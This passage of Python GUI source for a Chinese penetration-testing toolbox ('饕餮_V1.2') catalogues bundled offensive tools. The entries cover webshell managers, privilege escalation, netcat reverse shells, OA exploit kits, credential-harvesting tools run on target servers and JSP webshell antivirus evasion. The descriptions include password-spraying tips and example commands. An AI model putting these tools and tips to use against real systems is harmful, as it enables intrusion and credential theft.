             tool_use_commond='暂无', run_cmd=r"file\CheckList")

    # 冰蝎4
    elif name == "冰蝎4":
        # file_path打开文件夹
        buju(file_path=r"冰蝎4", tool_name="冰蝎4", tool_introduce=
        """
        冰蝎升级版本：冰蝎4
        """, tool_usage_method=
             """
             打开使用
             """,
             tool_use_commond='暂无', run_cmd=r"file\冰蝎4")

    # 天蝎
    elif name == "天蝎":
        # file_path打开文件夹
        buju(file_path=r"TianXie", tool_name="TianXie", tool_introduce=
        """
        天蝎管理工具：
        """, tool_usage_method=
             """
             打开使用
             """,
             tool_use_commond='暂无', run_cmd=r"file\TianXie")

    # 主机提权
    elif name == "主机提权":
        # file_path打开文件夹
        buju(file_path=r"主机提权", tool_name="主机提权", tool_introduce=
        """
        包含自己收集与使用的一些提权脚本
            windwos
            linux
        """, tool_usage_method=
             """
             打开使用
             """,
             tool_use_commond='暂无', run_cmd=r"file\主机提权")

    # 知识库
    elif name == "知识库":
        # file_path打开文件夹
        buju(file_path=r"知识库", tool_name="知识库", tool_introduce=
        """
        一些精华文章及知识
        Awesome-POC：地址 https://github.com/Threekiii/Awesome-POC 包含了各大cms,oa,web应用等
        PHP代码审计学习资料
        Payload-List-main:sql注入字典，路径字典，rce字典，xss子带你
        RedTeamNotes-main：红队的一些笔记
        T00LS论坛精华渗透实战文章
        内网通过内存加载dump内存解开密码，加载FRP
        2023年收集的安全面试真题
        适合破解新手的160个crackme练手
        145 个信息安全项目资料集锦（棱角社区）
            https://forum.ywhack.com/infosec.php
        默认密码查询
            defaultpasswd.xlsx
        红队知识库：
            https://github.com/Ridter/Intranet_Penetration_Tips
        """, tool_usage_method=
             """
             打开使用
             """,
             tool_use_commond='暂无', run_cmd=r"file\知识库")

    # dumpall
    elif name == "dumpall":
        # file_path打开文件夹
        buju(file_path=r"dumpall", tool_name="dumpall", tool_introduce=
        """
        dumpall 主要适用于
        svn信息泄露
        ds_store
        git信息泄露
        目录遍历下载
        """, tool_usage_method=
             """
             python dumpall.py
             """,
             tool_use_commond='暂无', run_cmd=r"file\dumpall")

    # nc
    elif name == "netcat":
        # file_path打开文件夹
        buju(file_path=r"netcat", tool_name="netcat", tool_introduce=
        """
        netcat 主要适用于
        远程windows主机下载nc反弹shell
        """, tool_usage_method=
             """
             打开使用
             """,
             tool_use_commond='暂无', run_cmd=r"file\netcat")
    # 环境搭建
    elif name == "环境搭建":
        # file_path打开文件夹
        buju(file_path=r"环境搭建", tool_name="环境搭建", tool_introduce=
        """
        环境搭建：
        包含php代码审计
        python
        burp suite
        """, tool_usage_method=
             """
             打开使用
             """,
             tool_use_commond='暂无', run_cmd=r"file\环境搭建")

    # 插件
    elif name == "插件":
        # file_path打开文件夹
        buju(file_path=r"插件", tool_name="插件", tool_introduce=
        """
        插件：
        包含
        cs插件
        burp插件
        google插件
        """, tool_usage_method=
             """
             使用对应的工具进行加载
             """,
             tool_use_commond='使用对应的工具进行加载', run_cmd=r"file\插件")
    # payload
    elif name == "payload":
        # file_path打开文件夹
        buju(file_path=r"payload", tool_name="payload", tool_introduce=
        """
        payload：
        包含
        GitLab、hadhoop、paper cut未授权、U8移动应用、F5 BIG IP
        深信服EDR <= v3.2.19任意用户登录
        """, tool_usage_method=
             """
             打开进行测试
             """,
             tool_use_commond='使用对应的工具进行加载', run_cmd=r"file\payload")

    # hack-browser
    elif name == "hack-browser":
        # file_path打开文件夹
        buju(file_path=r"hack-browser", tool_name="hack-browser", tool_introduce=
        """
        hack-browser：
        包含
        浏览器敏感信息收集工具
        直接到目标服务器进行运行，查看结果
        """, tool_usage_method=
             """
             上传运行hack-browser
             """,
             tool_use_commond='hack-browser', run_cmd=r"file\hack-browser")



    # observer_ward
    elif name == "observer_ward":
        # file_path打开文件夹
        buju(file_path=r"observer_ward_v2023.5.19", tool_name="observer_ward_v2023.5.19", tool_introduce=
        """
        observer_ward_v2023.5.19：
        指纹识别工具:
        具有存活探测，指纹识别功能。
        使用-u参数在线更新
        observer_ward.exe -u
        """, tool_usage_method=
             """
             observer_ward -f 1.txt -c result.csv
             """,
             tool_use_commond='observer_ward -f 1.txt -c result.csv', run_cmd=r"file\observer_ward_v2023.5.19")

    # 社工字典生成
    elif name == "社工字典生成":
        # file_path打开文件夹
        buju(file_path=r"SocialEngineeringDictionaryGenerator-master",
             tool_name="SocialEngineeringDictionaryGenerator-master", tool_introduce=
             """
        SocialEngineeringDictionaryGenerator-master：
        社工字典生成:
        直接打开html文件生成
        社工字典
        """, tool_usage_method=
             """
             SocialEngineeringDictionaryGenerator
             """,
             tool_use_commond='SocialEngineeringDictionaryGenerator',
             run_cmd=r"file\SocialEngineeringDictionaryGenerator-master")

    # xpoc_windows_amd64
    elif name == "xpoc_windows_amd64":
        # file_path打开文件夹
        buju(file_path=r"xpoc_windows_amd64", tool_name="xpoc_windows_amd64", tool_introduce=
        """
        xpoc_windows_amd64：
        xpoc_windows_amd64:
        xpoc使用
        """, tool_usage_method=
             """
             xpoc_windows_amd64
             """,
             tool_use_commond='xpoc_windows_amd64.exe -i 1.txt ', run_cmd=r"file\xpoc_windows_amd64")

    # exp-tools
    elif name == "exp_tools":
        # file_path打开文件夹
        buju(file_path=r"exp-tools", tool_name="exp-tools", tool_introduce=
        """
        exp-tools：
        包含各大OA
        用友，泛微，蓝凌，万户，帆软，致远，通达，红帆，华天动力
        工具原始链接：
        https://github.com/cseroad/Exp-Tools/releases
        """, tool_usage_method=
             """
             打开命令行输入以下命令
             """,
             tool_use_commond='java -javaagent:Exp-Tools-1.1.6-encrypted.jar -jar Exp-Tools-1.1.6-encrypted.jar ',
             run_cmd=r"file\exp-tools")
    # OA-EXPTOOL
    elif name == "OA-EXPTOOL":
        # file_path打开文件夹
        buju(file_path=r"OA-EXPTOOL", tool_name="OA-EXPTOOL", tool_introduce=
        """
       OA-EXPTOOL：
       tdscan:通达OA漏洞POC
       whscan:万户OA漏洞POC
       frscan:帆软OA漏洞POC
       ymscan:一米OA漏洞POC
       hfscan:红帆OA漏洞POC
       jdscan:金蝶OA漏洞POC
       llscan:蓝凌OA漏洞POC
       qlscan:启莱OA漏洞POC
       zxscan:致翔OA漏洞POC
       zxscan:致翔OA漏洞POC
       zyscan:致远OA漏洞POC
       zmscan:智明OA漏洞POC
       fwscan:泛微OA漏洞POC
       xdscan:新点OA漏洞POC
       yyscan:用友OA漏洞POC
       htdlscan:华天动力OA漏洞POC
        """, tool_usage_method=
             """
             打开命令行输入以下命令
             """,
             tool_use_commond='OA-EXPTOOL.exe \n python scan.py ', run_cmd=r"file\OA-EXPTOOL")

    # enscan
    elif name == "enscan":
        # file_path打开文件夹
        buju(file_path=r"enscan", tool_name="enscan", tool_introduce=
        """
       enscan：
       收集公司及下属公司子域名

        """, tool_usage_method=
             """
             -invest 控股多少以上
             -deep 递归深度
             """,
             tool_use_commond='enscan-0.0.14-windows-amd64.exe -f 1.txt -invest 50 -deep 3', run_cmd=r"file\enscan")

    # ihoneyBakFileScan_Modify
    elif name == "ihoneyBakFileScan_Modify":
        # file_path打开文件夹
        buju(file_path=r"ihoneyBakFileScan_Modify", tool_name="ihoneyBakFileScan_Modify", tool_introduce=
        """
       ihoneyBakFileScan_Modify：
       批量扫描url的备份文件
       python ihoneyBakFileScan_Modify.py -t 100 -f 1.txt -o result.txt

        """, tool_usage_method=
             """
             python ihoneyBakFileScan_Modify.py -t 100 -f 1.txt -o result.txt
             """,
             tool_use_commond='python ihoneyBakFileScan_Modify.py -t 100 -f 1.txt -o result.txt',
             run_cmd=r"file\ihoneyBakFileScan_Modify")

    # BBScan
    elif name == "BBScan":
        # file_path打开文件夹
        buju(file_path=r"BBScan", tool_name="BBScan", tool_introduce=
        """
       BBScan：
       批量扫描url的备份文件
       python ihoneyBakFileScan_Modify.py -t 100 -f 1.txt -o result.txt

        """, tool_usage_method=
             """
             python BBScan.py -t 100 -f 1.txt -o result.txt
             """,
             tool_use_commond='python BBScan.py -t 100 -f 1.txt -o result.txt', run_cmd=r"file\BBScan")

    # unauthorized
    elif name == "unauthorized":
        # file_path打开文件夹
        buju(file_path=r"unauthorized", tool_name="unauthorized", tool_introduce=
        """
       unauthorized：
       批量扫描IP或者域名
       python unauthorized_com.py -f 1.txt -o result.txt

        """, tool_usage_method=
             """
             python unauthorized_com.py -f 1.txt -o result.txt
             """,
             tool_use_commond='python unauthorized_com.py -f 1.txt - o result.txt', run_cmd=r"file\unauthorized")

    # Find-SomeThing
    elif name == "Find-SomeThing":
        # file_path打开文件夹
        buju(file_path=r"Find-SomeThing", tool_name="Find-SomeThing", tool_introduce=
        """
       Find-SomeThing：
       具有指纹识别功能
       xxl-job
       shiro
       等多种框架漏扫
       更新指纹：
       python scan.py -i 
       更新规则库：
       python scan.py -up
        """, tool_usage_method=
             """
             python scan.py -f 1.txt -o result.txt
             """,
             tool_use_commond='python scan.py -f 1.txt -o result.txt', run_cmd=r"file\Find-SomeThing")

    # Caesar
    elif name == "Caesar":
        # file_path打开文件夹
        buju(file_path=r"Caesar", tool_name="Caesar", tool_introduce=
        """
        Caesar：
        新一代路径扫描工具
        日志和发现的信息会保存在results目录下
        只能识别json字典
        caesar convert -d ~/path/
        将普通路径字典转换为程序能识别的json字典。将转换后的字典放在assets/directory目录下即可。
        -f asp,common,jsp,php,spring,weblogic
        -g 线程(default 3)
        -d 延迟时间 
        """, tool_usage_method=
             """
             Caesar.exe audit -t 1.txt  -f common -g 6
             """,
             tool_use_commond='Caesar.exe audit -t 1.txt  -f common -g 6', run_cmd=r"file\Caesar")

    # jjjjjjjjjjjjjs
    elif name == "jjjjjjjjjjjjjs":
        # file_path打开文件夹
        buju(file_path=r"jjjjjjjjjjjjjs", tool_name="jjjjjjjjjjjjjs", tool_introduce=
        """
        jjjjjjjjjjjjjs：
        webpack打包 api文档扫描
        更多使用方法自行查看帮助文档
        """, tool_usage_method=
             """
             python jjjjjjjjjjjjjs.py http://www.baidu.com
             """,
             tool_use_commond='python jjjjjjjjjjjjjs.py http://www.baidu.com', run_cmd=r"file\jjjjjjjjjjjjjs")


    # Guess_Dictionary
    elif name == "Guess_Dictionary":
        # file_path打开文件夹
        buju(file_path=r"Guess_Dictionary", tool_name="Guess_Dictionary", tool_introduce=
        """
        Guess_Dictionary：
        适用于存在的用户名用作字典生成
        用户名可以为拼音，拼音缩写，默认用户名，域名前缀
        Q：脚本使用范围
            1、知道用户确实存在，能进行爆破
            2、对内网（外网的也可以尝试）相关服务进行密码喷洒攻击
        Q:如何确认是否存在用户名
            A:用户名枚举 or 默认账号 
            如果用户名是工号1-6位直接梭哈
        Q：用户名获取来源
            A：来源如下
            1、互联网信息收集（用户姓名生成拼音字典 ）
            2、网页单词（域名，系统简称，系统名称，单位简称）
            3、系统帮助文档
        Q：如何增加成功率
            A:将目标单位的域名加在 config 密码top20.txt里面，例如qq.com写在后面
        Q：无法爆破怎么办
            A：对默认账号尝试 单位首字母大写@最近5年的年份 Gssy@2020

        """, tool_usage_method=
             """
             python 11.py
             """,
             tool_use_commond='python 11.py', run_cmd=r"file\Guess_Dictionary")

    # URL分类
    elif name == "URL分类":
        # file_path打开文件夹
        buju(file_path=r"URL分类", tool_name="URL分类", tool_introduce=
        """
        URL分类：
        jsfinder 收集一波url
        katana 收集一波url
        rad 收集一波url
        然后使用该程序进行分类测试
        """, tool_usage_method=
             """
             python 1.py
             """,
             tool_use_commond='python 1.py', run_cmd=r"file\URL分类")

    # suscan_pc
    elif name == "suscan_pc":
        # file_path打开文件夹
        buju(file_path=r"suscan_pc", tool_name="suscan_pc", tool_introduce=
        """
        suscan_pc：
        电脑端小程序解密
        需要进一步优化
        """, tool_usage_method=
             """
             D:\software\WeiXin\WeiXinDownload\WeChat Files\Applet
             api.weixin.qq.com
             python sensitive_of_wxapp.py
             """,
             tool_use_commond='python sensitive_of_wxapp.py', run_cmd=r"file\suscan_pc")

    # Check_encrypt_for_Applet
    elif name == "Check_encrypt_for_Applet":
        # file_path打开文件夹
        buju(file_path=r"Check_encrypt_for_Applet", tool_name="Check_encrypt_for_Applet", tool_introduce=
        """
        Check_encrypt_for_Applet：
        检查pc端小程序是否被加密，如果是就解密
        """, tool_usage_method=
             """
             复制路径，打开直接运行，程序会解密包
             """,
             tool_use_commond=r'D:\software\WeiXin\WeiXinDownload\WeChat Files\Applet',
             run_cmd=r"file\Check_encrypt_for_Applet")

    # wxappUnpacker
    elif name == "wxappUnpacker":
        # file_path打开文件夹
        buju(file_path=r"wxappUnpacker", tool_name="wxappUnpacker", tool_introduce=
        """
        wxappUnpacker：
        对小程序包进行解密
        """, tool_usage_method=
             """
             node wuWxapkg.js *.wxapkg
             node wuWxapkg.js *.wxapkg -s=/path
             """,
             tool_use_commond='node wuWxapkg.js *.wxapkg', run_cmd=r"file\wxappUnpacker")

    # get_path
    elif name == "get_path":
        # file_path打开文件夹
        buju(file_path=r"get_path", tool_name="get_path", tool_introduce=
        """
        get_path：
        从特定的文件夹中获取路径
        需要提前安装grep
        """, tool_usage_method=
             """
             1、将路径写入
             2、运行python get_path.py
             """,
             tool_use_commond='python get_path.py', run_cmd=r"file\get_path")

    # hashcat
    elif name == "hashcat":
        # file_path打开文件夹
        buju(file_path=r"hashcat", tool_name="hashcat", tool_introduce=
        """
        hashcat：
        获取的hash值写入1.txt，自己根据用户名，社工密码生成密码存入password.txt进行碰撞.
        查看result.txt 是否出货
        hashcat32.exe  -m 0 -a 0 1.txt password.txt -o result.txt
        -m：原始密码加密方法
        """, tool_usage_method=
             """
             获取的hash值写入1.txt，自己根据用户名，社工密码生成密码存入password.txt进行碰撞.
             查看result.txt 是否出货
             """,
             tool_use_commond='python 1.py', run_cmd=r"file\hashcat")

    # dictx
    elif name == "dictx":
        # file_path打开文件夹
        buju(file_path=r"dictx", tool_name="dictx", tool_introduce=
        """
        dictx：
        生成大量的字典，需要爆破的时候
        需要比较小的字典请运行Guess_Dictionary，需要hash爆破的情况下生成大量字典
        请运行
        Guess_Dictionary，dictx，社工字典生成。
        爆破无限制的话可用生成用户名
        直接运行环境python dictx.py
        """, tool_usage_method=
             """
             python dictx.py
             """,
             tool_use_commond='python dictx.py', run_cmd=r"file\dictx")

    # jsp免杀
    elif name == "jsp免杀":
        # jsp免杀
        buju(file_path=r"jsp免杀", tool_name="JCE", tool_introduce=
        """
        JCE：
        能过静态查杀，原理：将字符转换成html/unicode/cdata格式
        默认为unicode
        python jce.py -i 1.txt -o outfile.jsp [-t](html/unicode/cdata)
        """, tool_usage_method=
             """
             python jce.py -i 1.txt -o outfile.jsp -t html/unicode/cdata
             """,
             tool_use_commond='python jce.py -i 1.txt -o outfile.jsp -t html/unicode/cdata', run_cmd=r"file\jsp免杀")

    # secret_killer
    elif name == "secret_killer":
        buju(file_path=r"secret_killer", tool_name="secret_killer", tool_introduce=
        """
        secret_killer：
        目前支持微信小程序，企业微信，钉钉秘钥
        """, tool_usage_method=
             """
             python app.py
             """,
             tool_use_commond='python app.py', run_cmd=r"file\secret_killer")

    # SmartBI
    elif name == "SmartBI":
        buju(file_path=r"SmartBI", tool_name="SmartBI", tool_introduce=
        """
        SmartBI：
        支持3种方式绕过验证
        """, tool_usage_method=
             """
             打开文件夹直接点击
             """,
             tool_use_commond='', run_cmd=r"file\SmartBI")

    # Impacket_PyQt5-main
    elif name == "Impacket_PyQt5-main":
        buju(file_path=r"Impacket_PyQt5-main", tool_name="Impacket_PyQt5-main", tool_introduce=
        """
        Impacket_PyQt5-main：
        内网工具箱
        """, tool_usage_method=
             """
             python pyqt.py
             """,
             tool_use_commond='python pyqt.py', run_cmd=r"file\Impacket_PyQt5-main")

    # Oday_v1.0.3
    elif name == "Oday_v1.0.3":
        buju(file_path=r"Oday_v1.0.3", tool_name="Oday_v1.0.3", tool_introduce=
        """
        Oday_v1.0.3
        poc管理工具
        """, tool_usage_method=
             """
             打开文件夹位置直接使用
             """,
             tool_use_commond='', run_cmd=r"file\Oday_v1.0.3")

    # TongdaOATool1.3
    elif name == "TongdaOATool1.3":
        buju(file_path=r"TongdaOATool1.3", tool_name="TongdaOATool1.3", tool_introduce=
        """
        TongdaOATool1.3
        通达OA漏洞利用工具
        目前有13个漏洞
        """, tool_usage_method=
             """
             打开文件夹位置直接使用
             """,
             tool_use_commond='', run_cmd=r"file\TongdaOATool1.3")

    # Hyacinth
    elif name == "Hyacinth":
        buju(file_path=r"Hyacinth-main", tool_name="Hyacinth", tool_introduce=
        """
        Hyacinth
        具有漏洞利用，webshell免杀的功能，java命令编码
        """, tool_usage_method=
             """
             打开文件夹位置直接使用
             """,
             tool_use_commond='', run_cmd=r"file\Hyacinth-main")

    # SBSCAN-0.5
    elif name == "SBSCAN-0.5":
        buju(file_path=r"SBSCAN-0.5", tool_name="SBSCAN-0.5", tool_introduce=
        """
        SBSCAN-0.5
        专门测试springboot
        """, tool_usage_method=
             """
             SBSCAN-0.5
             # 指定目标站点url进行扫描
             $ python3 sbscan.py -u http://test.com
             # 指定url文件路径扫描，启用指纹检测，未检测到指纹的无需进行路径以及CVE扫描
             $ python3 sbscan.py -f url.txt --ff
             # 指定目标站点url、代理、线程数量
             $ python3 sbscan.py -u http://test.com -p 1.1.1.1:8888 -t 10
             # 指定目标站点url、启用纯净输出，只输出命中敏感路径或cve的目标、启用指纹检测，只有命中指纹的才继续扫描
             $ python3 sbscan.py -u http://test.com --quiet -ff
             # 指定url文件路径、指定dnslog域名、使用10个线程进行并发扫描并启用纯净输出
             $ python3 sbscan.py -f url.txt -t 4 -d 5pugcrp1.eyes.sh --quiet
             """,
             tool_use_commond='python sbscan.py -f 1.txt -t 10 --quiet ', run_cmd=r"file\SBSCAN-0.5")

    # 若依
    elif name == "若依":
        buju(file_path=r"ruoyi", tool_name="若依相关工具", tool_introduce=
        """
        若依
        专门测试若依相关工具
        """, tool_usage_method=
             """
             若依
             打开文件夹进行使用
             """,
             tool_use_commond='打开文件夹进行使用', run_cmd=r"file\ruoyi")

    # kscan
    elif name == "kscan":
        filepath = r"file\kscan"
        wrint_name = r"file\kscan\1.txt"
        tool_name = "kscan"
        tool_introduce = "kscan：\n资产测绘工具，包含资产测绘（存活探测，端口扫描）、口令爆破"
        tool_usage_method = "打开cmd运行"
        tool_use_commond = "kscan.exe -t 1.txt -p 1-65535 -oC result.csv"
        run_cmd = ""
        cmd_filepath = r"file\kscan"
        directory = filepath
        spider_fofa = ShowContent(file_path=filepath, tool_name=tool_name, tool_introduce=tool_introduce,
                                  tool_usage_method=tool_usage_method, tool_use_commond=tool_use_commond,
                                  run_cmd=run_cmd, wrint_name=wrint_name, cmd_filepath=cmd_filepath,
                                  directory=directory)
        spider_fofa.buju()

    # arjun
    elif name == "arjun":
        filepath = r"file\arjun"
        wrint_name = r"file\arjun\1.txt"
        tool_name = "arjun"
        tool_introduce = "arjun：\n安装：python -m pip install arjun -i https://mirrors.aliyun.com/pypi/simple/\n用于fuzz参数\n--passive 127.0.0.1 可用从目标收集参数"
        tool_usage_method = "打开cmd运行"
        tool_use_commond = "arjun -u http://127.0.0.1 -t 10 -oT result.txt"
        run_cmd = ""
        cmd_filepath = r"file\arjun"
        directory = filepath
        spider_fofa = ShowContent(file_path=filepath, tool_name=tool_name, tool_introduce=tool_introduce,
                                  tool_usage_method=tool_usage_method, tool_use_commond=tool_use_commond,
                                  run_cmd=run_cmd, wrint_name=wrint_name, cmd_filepath=cmd_filepath,
                                  directory=directory)
        spider_fofa.buju()

    # 0day_2023
    elif name == "0day_2023":
        filepath = r"file\0day_2023"
        wrint_name = r"file\0day_2023\1.txt"
        tool_name = "0day_2023"
        tool_introduce = "0day_2023"
        tool_usage_method = "打开文件夹"
        tool_use_commond = "打开文件夹"
        run_cmd = ""
        cmd_filepath = r"file\0day_2023"
        directory = filepath
        spider_fofa = ShowContent(file_path=filepath, tool_name=tool_name, tool_introduce=tool_introduce,
                                  tool_usage_method=tool_usage_method, tool_use_commond=tool_use_commond,
                                  run_cmd=run_cmd, wrint_name=wrint_name, cmd_filepath=cmd_filepath,
                                  directory=directory)
        spider_fofa.buju()

    # AppInfoScanner
    elif name == "AppInfoScanner":
        filepath = r"file\AppInfoScanner"
        wrint_name = r"file\AppInfoScanner\1.txt"
        tool_name = "AppInfoScanner"
        tool_introduce = "能扫描web，android，ios中的敏感信息"
        tool_usage_method = "python app.py android -i com.yuque.mobile.android.app.apk1"
        tool_use_commond = "python app.py android -i com.yuque.mobile.android.app.apk"
        run_cmd = "python app.py android -i com.yuque.mobile.android.app.apk3"
        cmd_filepath = r"file\AppInfoScanner"
        directory = filepath
        spider_fofa = ShowContent(file_path=filepath, tool_name=tool_name, tool_introduce=tool_introduce,
                                  tool_usage_method=tool_usage_method, tool_use_commond=tool_use_commond,
                                  run_cmd=run_cmd, wrint_name=wrint_name, cmd_filepath=cmd_filepath,
                                  directory=directory)
        spider_fofa.buju()


    # x64dbg_new
    elif name == "x64dbg_new":
        filepath = r"file\x64dbg_new"
        wrint_name = r"file\x64dbg_new\1.txt"
        tool_name = "x64dbg_new"
        tool_introduce = "能修改内存中的数据!\n例如：可以利用该工具开启小程序中的调试"
        tool_usage_method = "见视频"
        tool_use_commond = "见视频"
        run_cmd = "见视频"
        cmd_filepath = r"file\x64dbg_new"
        directory = filepath
        spider_fofa = ShowContent(file_path=filepath, tool_name=tool_name, tool_introduce=tool_introduce,
                                  tool_usage_method=tool_usage_method, tool_use_commond=tool_use_commond,
                                  run_cmd=run_cmd, wrint_name=wrint_name, cmd_filepath=cmd_filepath,
                                  directory=directory)
        spider_fofa.buju()


    # yongyouNC
    elif name == "yongyouNC":
        filepath = r"file\yongyouNC"
        wrint_name = r"file\yongyouNC\1.txt"
        tool_name = "yongyouNC"
        tool_introduce = "对用友相关的漏洞进行利用"
        tool_usage_method = "打开文件夹使用"
        tool_use_commond = "打开文件夹"
        run_cmd = "打开文件夹"
        cmd_filepath = r"file\yongyouNC"
        directory = filepath
        spider_fofa = ShowContent(file_path=filepath, tool_name=tool_name, tool_introduce=tool_introduce,
                                  tool_usage_method=tool_usage_method, tool_use_commond=tool_use_commond,
                                  run_cmd=run_cmd, wrint_name=wrint_name, cmd_filepath=cmd_filepath,
                                  directory=directory)
        spider_fofa.buju()


    # xxl-job
    elif name == "xxl-job":
        filepath = r"file\xxl-job"
        wrint_name = r"file\xxl-job\1.txt"
        tool_name = "xxl-job"
        tool_introduce = "对xxljob相关的漏洞进行利用"
        tool_usage_method = "打开文件夹使用"
        tool_use_commond = "打开文件夹"
        run_cmd = "打开文件夹"
        cmd_filepath = r"file\xxl-job"
        directory = filepath
        spider_fofa = ShowContent(file_path=filepath, tool_name=tool_name, tool_introduce=tool_introduce,
                                  tool_usage_method=tool_usage_method, tool_use_commond=tool_use_commond,
                                  run_cmd=run_cmd, wrint_name=wrint_name, cmd_filepath=cmd_filepath,
                                  directory=directory)
        spider_fofa.buju()


    # XG_NTAI
    elif name == "XG_NTAI":
        filepath = r"file\XG_NTAI"
        wrint_name = r"file\XG_NTAI\1.txt"
        tool_name = "XG_NTAI"
        tool_introduce = "对XG_NTAI相关的漏洞进行利用"
        tool_usage_method = "打开文件夹使用"
        tool_use_commond = "打开文件夹"
        run_cmd = "打开文件夹"
        cmd_filepath = r"file\XG_NTAI"
        directory = filepath
        spider_fofa = ShowContent(file_path=filepath, tool_name=tool_name, tool_introduce=tool_introduce,
                                  tool_usage_method=tool_usage_method, tool_use_commond=tool_use_commond,
                                  run_cmd=run_cmd, wrint_name=wrint_name, cmd_filepath=cmd_filepath,
                                  directory=directory)
        spider_fofa.buju()

    # weekoa
    elif name == "weekoa":
        filepath = r"file\weekoa1.5"
        wrint_name = r"file\weekoa1.5\1.txt"
        tool_name = "weekoa"
        tool_introduce = "对weekoa，对oa进行利用"
        tool_usage_method = "打开文件夹使用"
        tool_use_commond = "weekoa.exe"
        run_cmd = ""
        cmd_filepath = r"file\weekoa1.5"
        directory = filepath
        spider_fofa = ShowContent(file_path=filepath, tool_name=tool_name, tool_introduce=tool_introduce,
                                  tool_usage_method=tool_usage_method, tool_use_commond=tool_use_commond,
                                  run_cmd=run_cmd, wrint_name=wrint_name, cmd_filepath=cmd_filepath,
                                  directory=directory)
        spider_fofa.buju()

    # 语法生成
    elif name == "语法生成":
        filepath = r"file\语法生成"
        wrint_name = r"file\语法生成\1.txt"
        tool_name = "语法生成"
        tool_introduce = "生成谷歌语法(包含了谷歌，百度，必应，搜狗)\ngithub语法：待开发"
        tool_usage_method = "打开文件夹使用"
        tool_use_commond = "无"
        run_cmd = ""
        cmd_filepath = r"file\语法生成"
        directory = filepath
        spider_fofa = ShowContent(file_path=filepath, tool_name=tool_name, tool_introduce=tool_introduce,
                                  tool_usage_method=tool_usage_method, tool_use_commond=tool_use_commond,
                                  run_cmd=run_cmd, wrint_name=wrint_name, cmd_filepath=cmd_filepath,
                                  directory=directory)
        spider_fofa.buju()

    # selenium_crak
    elif name == "selenium_crak":
        filepath = r"file\selenium_crak"
        wrint_name = r"file\selenium_crak\1.txt"
        tool_name = "selenium_crak"
        tool_introduce = "使用selenium进行爆破，解决无验证码情况下复杂的加密爆破\n爆破结果在在Brute-Log.txt 中查看\n用户名和字典为username.txt\n密码为password.txt"
        tool_usage_method = "python -lu url -uc user_class -pc pass_class -bhr button_xpath "
        tool_use_commond = "无"
        run_cmd = ""
        cmd_filepath = r"file\selenium_crak"
        directory = filepath
        spider_fofa = ShowContent(file_path=filepath, tool_name=tool_name, tool_introduce=tool_introduce,
                                  tool_usage_method=tool_usage_method, tool_use_commond=tool_use_commond,
                                  run_cmd=run_cmd, wrint_name=wrint_name, cmd_filepath=cmd_filepath,
                                  directory=directory)
        spider_fofa.buju()

    # IWannaGetAll
    elif name == "IWannaGetAll":
        filepath = r"file\IWannaGetAll"
        wrint_name = r"file\IWannaGetAll\1.txt"
        tool_name = "IWannaGetAll"
        tool_introduce = "APT_Tools的魔改版"
        tool_usage_method = "打开文件夹进行使用"
        tool_use_commond = "无"
        run_cmd = ""
        cmd_filepath = r"file\IWannaGetAll"
        directory = filepath
        spider_fofa = ShowContent(file_path=filepath, tool_name=tool_name, tool_introduce=tool_introduce,
                                  tool_usage_method=tool_usage_method, tool_use_commond=tool_use_commond,
                                  run_cmd=run_cmd, wrint_name=wrint_name, cmd_filepath=cmd_filepath,
                                  directory=directory)
        spider_fofa.buju()

    # 0x7eTeamTools
    elif name == "0x7eTeamTools":
        filepath = r"file\0x7eTeamTools.v1.2"
        wrint_name = r"file\0x7eTeamTools.v1.2\1.txt"
        tool_name = "0x7eTeamTools.v1.2"
        tool_introduce = "0x7eTeamTools.v1.2"
        tool_usage_method = "包括JS文件生成，内网渗透，字典生成，杀软识别，DNSlog，编码转化"
        tool_use_commond = "无"
        run_cmd = ""
        cmd_filepath = r"file\0x7eTeamTools.v1.2"
        directory = filepath
        spider_fofa = ShowContent(file_path=filepath, tool_name=tool_name, tool_introduce=tool_introduce,
                                  tool_usage_method=tool_usage_method, tool_use_commond=tool_use_commond,
                                  run_cmd=run_cmd, wrint_name=wrint_name, cmd_filepath=cmd_filepath,
                                  directory=directory)
        spider_fofa.buju()


    # # 吾爱破解工具箱
    # elif name == "吾爱破解工具箱":
    #     filepath = r"file\吾爱破解工具箱"
    #     wrint_name = r"file\吾爱破解工具箱\1.txt"
    #     tool_name = "吾爱破解工具箱"
    #     tool_introduce = "吾爱破解工具箱"
    #     tool_usage_method = "逆向相关工具使用"
    #     # 填写命令
    #     tool_use_commond = "无"
    #     run_cmd = ""
    #     cmd_filepath = r"file\吾爱破解工具箱"
    #     directory = filepath
    #     spider_fofa = ShowContent(file_path=filepath, tool_name=tool_name, tool_introduce=tool_introduce,
    #                               tool_usage_method=tool_usage_method, tool_use_commond=tool_use_commond,
    #                               run_cmd=run_cmd, wrint_name=wrint_name, cmd_filepath=cmd_filepath,
    #                               directory=directory)
    #     spider_fofa.buju()

# 获取所有的子节点中的vaue
def get_all_children(tree, parent=''):
    children = tree.get_children(parent)
    all_data = []
    for child in children:
        data = tree.item(child)
        all_data.append(data)
        all_data.extend(get_all_children(tree, child))
    return all_data

# 搜索
def search():
    data = get_all_children(tree)
    all_data = []
    for i in data:
        all_data.append(i['text'])
    # 转换为大小写搜索
    keyword = entry.get()
    lowercase_dict = {s.lower(): s for s in all_data}

    # keywords
    keywords = []
    for i in lowercase_dict:
        if keyword in i:
            keywords.append(lowercase_dict[i])

    show_data(keywords)

def show_data(data):
    # 创建文本框并显示数据
    tree1 = ttk.Treeview(root, columns=("结果",), show="")
    tree1.column("结果", width=50)
    tree1.place(relx=0, rely=0.096,relheight=0.2, relwidth=0.161)
    for item in data:
        tree1.insert("", "end", values=item)

    tree1.bind("<Double-1>", on_cell_click)

def on_cell_click(event):
    try:
        # 获取点击的item中内容
        item = event.widget.identify('item', event.x, event.y)
        value = event.widget.item(item, "values")[0]
        show_connect(value)
        # 使用event事件关闭tree1
        event.widget.destroy()
    except:
        event.widget.destroy()

if __name__ == '__main__':
    # 创建主窗口
    root = tk.Tk()
    root.title("饕餮_V1.2 by suchangyu")

    # 设置暗黑格式，有light,也可以注释掉，会恢复tk原本，dark
    sv_ttk.set_theme("dark")

    width, height = 900, 600
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    x = int(screen_width / 2 - width / 2)
    y = int(screen_height / 2 - height / 2)
    size = '{}x{}+{}+{}'.format(width, height, x, y)
    root.geometry(size)

    # 创建搜索框及搜索
    entry = tk.Entry(root)
    entry.place(relx=0, rely=0.065)
    search_button = tk.Button(root, text="搜索", command=search)
    search_button.place(relx=0.16, rely=0.065)

    # 创建收缩栏
    tree = ttk.Treeview(root, style="Custom.Treeview")

    # 创建自定义样式，为Treeview设置间距
    style = ttk.Style(root)
